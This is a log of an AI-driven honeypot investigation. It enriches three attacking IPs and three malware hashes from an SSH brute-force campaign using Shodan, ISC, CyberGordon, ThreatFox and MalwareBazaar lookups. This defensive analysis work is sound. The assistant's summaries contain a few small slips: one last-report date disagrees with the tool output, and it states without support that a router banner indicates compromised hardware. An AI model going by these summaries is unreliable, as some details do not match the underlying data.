6. **Session ID:** 6c83f979e0b5  
   **Username:** pi  
   **Password:** raspberryraspberry993311  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

7. **Session ID:** 617df930d4a6  
   **Username:** N/A  
   **Password:** N/A  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  
   **Notes:** No login attempt recorded.

8. **Session ID:** c0a95962c75a  
   **Username:** pi  
   **Password:** raspberryraspberry993311  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

9. **Session ID:** 9a98fb146784  
   **Username:** pi  
   **Password:** raspberryraspberry993311  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

The SSH hassh `ec7378c1a92f5a8dde7e8b7a1ddf33d1` is consistent across all sessions, indicating that the same SSH client was likely used for the attempted connections. Multiple sessions involved successful login attempts with the username "pi" and similar or identical passwords, suggesting an automated or scripted attack to compromise the system using default or commonly used credentials.


Asking: Summarize what is known about the location of the IP addresses involved in the attack.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM

AI called tool: query_ip_data
with args: {'ips': ['93.223.169.159'], 'sources': ['shodan', 'isc', 'cybergordon']}
Using saved shodan data ip for 93.223.169.159
Using saved isc data ip for 93.223.169.159
Using saved cybergordon data ip for 93.223.169.159

Submitting tool output: {'93.223.169.159': {'shodan': {'port8089': {'protocol': 'tcp', 'service_name': 'unknown', 'service_data_raw': 'HTTP/1.1 404 Not Found\nContent-Length: 0'}}, 'isc': {'total_reports': 11, 'honeypots_targeted': 2, 'firstseen': '2023-09-16', 'lastseen': '2024-02-01', 'network': '93.192.0.0/10', 'asname': 'DTAG Internet service provider operations', 'as_country_code': ('DE', None), 'threatfeeds': {'blocklistde22': {'lastseen': '2024-02-01', 'firstseen': '2023-09-13'}}}, 'cybergordon': {'[E34] IPdata.co': 'Geo: Frankfurt am Main, Hessen, Germany. Network: AS3320, Deutsche Telekom Ag, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Charles Haley, DataPlane.org, James Brine, Scriptz Team. ', '[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E2] AbuseIPDB': 'Hostname(s): p5ddfa99f.dip0.t-ipconnect.de. ISP: Deutsche Telekom AG. Usage: None. Risk 100%. 492 report(s) by 213 user(s), last on 03 February 2024  ', '[E33] GreyNoise': 'Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E24] BlackList DE': 'Found in 28 attack(s) and 22 report(s) ', '[E11] DShield/ISC': 'Found in 11 report(s) listing 2 target(s), last on 1 Feb 2024 ', '[E17] Pulsedive': 'Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. ', '[E12] AlienVault OTX': 'Found in 6 pulse-feed(s) '}}}

AI called tool: query_ip_data
with args: {'ips': ['27.93.25.111'], 'sources': ['shodan', 'isc', 'cybergordon']}
Using saved shodan data ip for 27.93.25.111
Using saved isc data ip for 27.93.25.111
Using saved cybergordon data ip for 27.93.25.111

Submitting tool output: {'27.93.25.111': {'shodan': {'port22': {'protocol': 'tcp', 'service_name': 'OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1'}, 'port80': {'protocol': 'tcp', 'service_name': 'Apache httpd2.4.38'}}, 'isc': {'total_reports': 17, 'honeypots_targeted': 4, 'firstseen': '2023-09-28', 'lastseen': '2024-02-02', 'network': '27.93.0.0/16', 'asname': 'KDDI KDDI CORPORATION', 'as_country_code': ('JP', None), 'threatfeeds': {'blocklistde22': {'lastseen': '2024-02-02', 'firstseen': '2023-09-29'}}}, 'cybergordon': {'[E33] GreyNoise': 'Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E34] IPdata.co': 'Geo: Hiroshima, Hirosima (Hiroshima), Japan. Network: AS2516, KDDI Corporation, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine. ', '[E11] DShield/ISC': 'Found in 17 report(s) listing 4 target(s), last on 2 Feb 2024 ', '[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E24] BlackList DE': 'Found in 64 attack(s) and 29 report(s) ', '[E2] AbuseIPDB': 'Hostname(s): KD027093025111.ppp-bb.dion.ne.jp. ISP: KDDI Corporation. Usage: None. Risk 100%. 1060 report(s) by 373 user(s), last on 03 February 2024  ', '[E17] Pulsedive': 'Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): HTTP, SSH. ', '[E12] AlienVault OTX': 'Found in 16 pulse-feed(s) ', '[E23] Offline Feeds': 'Found in Duggy Tuxy - EU Botnets/Zombies/Scanners '}}}

AI called tool: query_ip_data
with args: {'ips': ['111.216.194.148'], 'sources': ['shodan', 'isc', 'cybergordon']}
Using saved shodan data ip for 111.216.194.148
Using saved isc data ip for 111.216.194.148
Using saved cybergordon data ip for 111.216.194.148

Submitting tool output: {'111.216.194.148': {'shodan': {'port22': {'protocol': 'tcp', 'service_name': 'OpenSSH7.9p1 Raspbian-10+deb10u2+rpt1'}, 'port445': {'protocol': 'tcp', 'service_name': 'unknown', 'service_data_raw': 'SMB Status:\n  Authentication: enabled\n  SMB Version: 2\n  Capabilities: raw-mode'}, 'port3389': {'protocol': 'tcp', 'service_name': 'Remote Desktop Protocol'}, 'port8443': {'protocol': 'tcp', 'service_name': 'ASUS Wireless Router RT-AX86U'}, 'port9876': {'protocol': 'tcp', 'service_name': 'unknown', 'service_data_raw': 'HTTP/1.1 401 Unauthorized\nWww-Authenticate: Basic realm="Restricted"\nDate: Wed, 17 Jan 2024 12:26:15 GMT\nContent-Length: 0'}}, 'isc': {'total_reports': 11, 'honeypots_targeted': 4, 'firstseen': '2023-11-26', 'lastseen': '2024-02-02', 'network': '111.216.0.0/15', 'asname': 'SO-NET Sony Network Communications Inc.', 'as_country_code': ('JP', None), 'threatfeeds': {'blocklistde22': {'lastseen': '2024-02-02', 'firstseen': '2023-11-27'}}}, 'cybergordon': {'[E33] GreyNoise': 'Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. ', '[E34] IPdata.co': 'Geo: Yokohama, Kanagawa, Japan. Network: AS2527, Sony Network Communications Inc, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, DataPlane.org, James Brine. ', '[E26] MetaDefender': 'Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) ', '[E2] AbuseIPDB': 'Hostname(s): fp6fd8c294.ap.nuro.jp. ISP: Sony Network Communications Inc.. Usage: None. Risk 100%. 449 report(s) by 208 user(s), last on 03 February 2024  ', '[E24] BlackList DE': 'Found in 27 attack(s) and 16 report(s) ', '[E11] DShield/ISC': 'Found in 11 report(s) listing 4 target(s), last on 2 Feb 2024 ', '[E17] Pulsedive': 'Risk: low. Last seen on 2 Feb 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts. Opened service(s): HTTPS, NETBIOS, RDP, SSH. ', '[E12] AlienVault OTX': 'Found in 7 pulse-feed(s) ', '[E23] Offline Feeds': 'Found in IPsum (3+ blocklists) '}}}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_tNyqvvuOVdx6EIUkb5MRLaRM
Run run_tNyqvvuOVdx6EIUkb5MRLaRM completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_tNyqvvuOVdx6EIUkb5MRLaRM

 Done with: Summarize what is known about the location of the IP addresses involved in the attack.
Answer: The locations of the IP addresses involved in the attack are summarized below:

### IP: 93.223.169.159
- **Geolocation:** Frankfurt am Main, Hessen, Germany
- **Network:** AS3320, Deutsche Telekom Ag (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for malicious activities and SSH brute force.
  - Reported in 492 different reports by 213 users on AbuseIPDB.
  - Last reported on February 3, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.

### IP: 27.93.25.111
- **Geolocation:** Hiroshima, Hiroshima (Hiroshima), Japan
- **Network:** AS2516, KDDI Corporation (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for SSH brute force attacks.
  - Reported in 1060 different reports by 373 users on AbuseIPDB.
  - Last reported on February 2, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.
  - Running services observed on Shodan: OpenSSH, Apache HTTPD.

### IP: 111.216.194.148
- **Geolocation:** Yokohama, Kanagawa, Japan
- **Network:** AS2527, Sony Network Communications Inc (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for SSH brute force attacks.
  - Reported in 449 different reports by 208 users on AbuseIPDB.
  - Last reported on February 3, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.
  - Running services observed on Shodan: OpenSSH, NETBIOS, RDP (Remote Desktop Protocol), HTTPS.

The threat actors behind these IP addresses seem to be associated with malicious internet activities, including brute force attacks on SSH services, and are listed in several threat feeds and blocklists indicating a history of offensive activities. These IPs are from business-oriented networks owned by major Telcos in Germany and Japan.


Asking: Summarize what is known about the IP addresses involved in the attack using Shodan data.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Xms1AztPgIusZMhfhoBu6TtA
Run run_Xms1AztPgIusZMhfhoBu6TtA completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_Xms1AztPgIusZMhfhoBu6TtA

 Done with: Summarize what is known about the IP addresses involved in the attack using Shodan data.
Answer: Based on Shodan data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Open Port:** 8089
- **Protocol:** TCP
- **Service Name:** Unknown
- **Service Data:** HTTP/1.1 404 Not Found response observed.
- **Additional Information:** No further detailed service information available from Shodan.

### IP: 27.93.25.111
- **Open Ports:** 22, 80
- **Protocols:** TCP
- **Service Names:** OpenSSH 7.9p1 Raspbian-10+deb10u2+rpt1 (Port 22), Apache httpd 2.4.38 (Port 80)
- **Additional Information:** Running a version of OpenSSH associated with Raspbian and an Apache HTTP server, suggesting the possibility of a compromised or controlled device running commonly used software.

### IP: 111.216.194.148
- **Open Ports:** 22, 445, 3389, 8443, 9876
- **Protocols:** TCP
- **Service Names and Data:**
  - OpenSSH 7.9p1 Raspbian-10+deb10u2+rpt1 (Port 22)
  - Service on port 445 with enabled SMB authentication, SMB version 2 capability (Port 445)
  - Remote Desktop Protocol, suggesting access to Windows systems (Port 3389)
  - ASUS Wireless Router RT-AX86U, indicating compromised or controlled networking hardware (Port 8443)
  - An unknown service with an HTTP/1.1 401 Unauthorized response, implying a password-protected resource (Port 9876)
- **Additional Information:** A range of services suggest the potential use of compromised devices and a variety of available attack vectors.

The Shodan data implies that the attackers may be utilizing compromised devices as part of their attack infrastructure, with open ports and services that could be indicative of botnets or other forms of malicious activity. The presence of various services like OpenSSH, Apache HTTPD, SMB, RDP, and specific hardware like an ASUS router offers insights into the nature of these hosts and their potential use in attack campaigns.


Asking: Summarize what is known about the IP addresses involved in the attack using ISC data.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_CkCRZhyY0YoOFQc6Tei0jJYx
Run run_CkCRZhyY0YoOFQc6Tei0jJYx completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_CkCRZhyY0YoOFQc6Tei0jJYx

 Done with: Summarize what is known about the IP addresses involved in the attack using ISC data.
Answer: Based on ISC (Internet Storm Center) data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Total Reports:** 11
- **Honeypots Targeted:** 2
- **First Seen:** September 16, 2023
- **Last Seen:** February 1, 2024
- **Network:** 93.192.0.0/10
- **AS Name:** DTAG Internet service provider operations
- **AS Country Code:** Germany
- **Threat Feeds:**
  - Blocklistde22 (first seen on September 13, 2023, last seen on February 1, 2024)

### IP: 27.93.25.111
- **Total Reports:** 17
- **Honeypots Targeted:** 4
- **First Seen:** September 28, 2023
- **Last Seen:** February 2, 2024
- **Network:** 27.93.0.0/16
- **AS Name:** KDDI Corporation
- **AS Country Code:** Japan
- **Threat Feeds:**
  - Blocklistde22 (first seen on September 29, 2023, last seen on February 2, 2024)

### IP: 111.216.194.148
- **Total Reports:** 11
- **Honeypots Targeted:** 4
- **First Seen:** November 26, 2023
- **Last Seen:** February 2, 2024
- **Network:** 111.216.0.0/15
- **AS Name:** Sony Network Communications Inc.
- **AS Country Code:** Japan
- **Threat Feeds:**
  - Blocklistde22 (first seen on November 27, 2023, last seen on February 2, 2024)

The ISC data indicates that all three IP addresses have been repeatedly reported for malicious activities targeting honeypots, which serve as security mechanisms set up to detect and analyze unauthorized accesses and attacks. These IPs have been active over several months, as indicated by the first and last seen dates, with multiple reports suggesting ongoing malicious behavior. They are associated with large network providers in Germany and Japan and have been recorded on threat feed blocklistde22.


Asking: Summarize what is known about the IP addresses involved in the attack using ThreatFox.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_17RYAauRWy9UU8xq4Wf1UeZn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_17RYAauRWy9UU8xq4Wf1UeZn
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_17RYAauRWy9UU8xq4Wf1UeZn

AI called tool: query_ioc_data
with args: {'ioc_type': 'ip', 'iocs': ['93.223.169.159'], 'sources': ['threatfox']}
Using saved threatfox data ip for 93.223.169.159

Submitting tool output: {'93.223.169.159': {'threatfox': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'ip', 'iocs': ['27.93.25.111'], 'sources': ['threatfox']}
Using saved threatfox data ip for 27.93.25.111

Submitting tool output: {'27.93.25.111': {'threatfox': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'ip', 'iocs': ['111.216.194.148'], 'sources': ['threatfox']}
Using saved threatfox data ip for 111.216.194.148

Submitting tool output: {'111.216.194.148': {'threatfox': ''}}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_17RYAauRWy9UU8xq4Wf1UeZn
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_17RYAauRWy9UU8xq4Wf1UeZn
Run run_17RYAauRWy9UU8xq4Wf1UeZn completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_17RYAauRWy9UU8xq4Wf1UeZn

 Done with: Summarize what is known about the IP addresses involved in the attack using ThreatFox.
Answer: Based on the ThreatFox data, there is no information or reports associated with the IP addresses involved in the attack:
- 93.223.169.159
- 27.93.25.111
- 111.216.194.148

ThreatFox does not have any entries for these IPs, which suggests that they may not have been reported or tracked in this particular threat intelligence platform at this time.


Asking: Summarize what is known about the IP addresses involved in the attack using CyberGordon.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pOd1QWdoe0FvTJv89bLanIiX
Run run_pOd1QWdoe0FvTJv89bLanIiX completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_pOd1QWdoe0FvTJv89bLanIiX

 Done with: Summarize what is known about the IP addresses involved in the attack using CyberGordon.
Answer: Based on CyberGordon data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Geolocation:** Frankfurt am Main, Hessen, Germany
- **Network:** AS3320, Deutsche Telekom AG (business)
- **Security Risks:** Noted for malicious/attacker activity and abuse/bot activity
- **Blocklists:** Listed on various blocklists including those by Charles Haley, DataPlane.org, James Brine, and the Scriptz Team.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

### IP: 27.93.25.111
- **Geolocation:** Hiroshima, Hirosima (Hiroshima), Japan
- **Network:** AS2516, KDDI Corporation (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **Blocklists:** Featured on Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

### IP: 111.216.194.148
- **Geolocation:** Yokohama, Kanagawa, Japan
- **Network:** AS2527, Sony Network Communications Inc (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **Blocklists:** Included in Anti-attacks.com, DataPlane.org, and James Brine.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

The data from CyberGordon corroborates the findings from other sources, indicating that these IP addresses are associated with suspicious or malicious behavior, and they are listed in multiple security-related blocklists and threat intelligence sources. This further confirms a pattern of attack behavior from these IPs, as they're linked with various types of malicious activities, especially related to network abuse and bot activity.


Asking: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_attack_attrs
with args: {'attrs': ['uniq_src_ips', 'uniq_malware']}

Submitting tool output: {'uniq_src_ips': {'93.223.169.159', '27.93.25.111', '111.216.194.148'}, 'uniq_malware': {Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet-stream Downloaded by: 93.223.169.159 Session fa6fb05e952d , Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet-stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 , Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet-stream Downloaded by: 111.216.194.148 Session c0a95962c75a }}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Using saved threatfox data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus
ERROR: Error caught while getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus: Invalid arg_type: hash

Submitting tool output: {'10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c': {'malwarebazaar': {'first_seen': '2022-07-16 05:08:48', 'file_name': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'file_size': 4766, 'file_type_mime': 'application/octet-stream', 'file_type': 'sh', 'delivery_method': 'other', 'intelligence': {'clamav_signatures': ['SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL'], 'times_downloaded_from_malwarebazaar': '83', 'times_uploaded_to_malwarebazaar': '1'}, 'vendor_intel': {'YOROI_YOMI': {'detection': 'Legit File', 'score': '0.00'}, 'InQuest': {'verdict': 'MALICIOUS'}, 'ReversingLabs': {'threat_name': 'Linux.Trojan.Generic', 'status': 'SUSPICIOUS', 'first_seen': '2021-05-12 07:07:18', 'scanner_count': '42', 'scanner_match': '27', 'scanner_percent': '64.29'}, 'Spamhaus_HBL': [{'detection': 'suspicious'}]}}, 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Using saved threatfox data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus
ERROR: Error caught while getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus: Invalid arg_type: hash

Submitting tool output: {'1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Using saved threatfox data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus
ERROR: Error caught while getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus: Invalid arg_type: hash

Submitting tool output: {'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}
